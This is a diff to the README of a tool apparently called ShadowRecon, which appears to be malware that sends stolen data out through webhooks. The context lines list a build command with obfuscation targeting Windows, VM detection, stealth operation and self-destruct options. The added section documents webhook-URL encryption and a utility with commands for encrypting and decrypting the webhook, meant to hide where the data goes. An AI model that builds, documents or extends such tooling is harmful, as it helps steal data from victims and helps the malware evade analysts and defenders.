@@ -109,9 +109,27 @@ node build/builder.js <webhook> <name> --obfuscate --compress --target node16-wi
 
 - VM detection (configurable)
 - Stealth operation
-- Encrypted communications
+- **Encrypted webhook URLs** - Webhooks are automatically encrypted to prevent casual reading
 - Self-destruct options
 - Obfuscated builds
+
+### Webhook Encryption
+
+ShadowRecon automatically encrypts webhook URLs to prevent them from being easily readable by malicious users:
+
+```bash
+# Utility for managing encrypted webhooks
+node webhook-util.js encrypt <webhook_url>     # Encrypt a webhook URL
+node webhook-util.js decrypt <encrypted_data>  # Decrypt an encrypted webhook  
+node webhook-util.js show-config               # Show decrypted webhook from config
+node webhook-util.js encrypt-config            # Encrypt webhook in config.json
+```
+
+The encryption:
+- Uses AES-256-GCM encryption with system-derived keys
+- Is automatically applied during build process
+- Maintains backward compatibility with plain-text webhooks
+- Protects against casual inspection of configuration files
 
 ## 📊 Statistics
 
